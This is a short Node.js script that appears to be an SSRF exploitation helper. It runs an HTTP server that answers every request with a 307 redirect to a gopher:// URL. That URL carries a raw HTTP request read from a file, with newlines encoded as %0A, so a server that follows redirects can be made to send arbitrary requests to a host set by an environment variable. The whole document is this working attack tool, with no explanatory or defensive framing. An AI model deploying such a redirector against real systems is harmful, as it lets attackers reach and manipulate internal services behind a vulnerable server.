const { createServer } = require('http');
const fs = require('fs');

// Read redirect location from ENV
const redirectHost = process.env.REDIRECT_HOST || "localhost:3000"

// Change redirect_request.req to full, valid HTTP request
const redirectReq = fs.readFileSync('redirect_request.req', 'utf-8');
const commands = redirectReq.replace(/\n/g, '%0A');

createServer((req, res) => {
    const STATUS = 307;
    const Location = `gopher://${redirectHost}/_${commands}`;
    res.writeHead(STATUS, { Location } );
    res.end();
}).listen(3000);
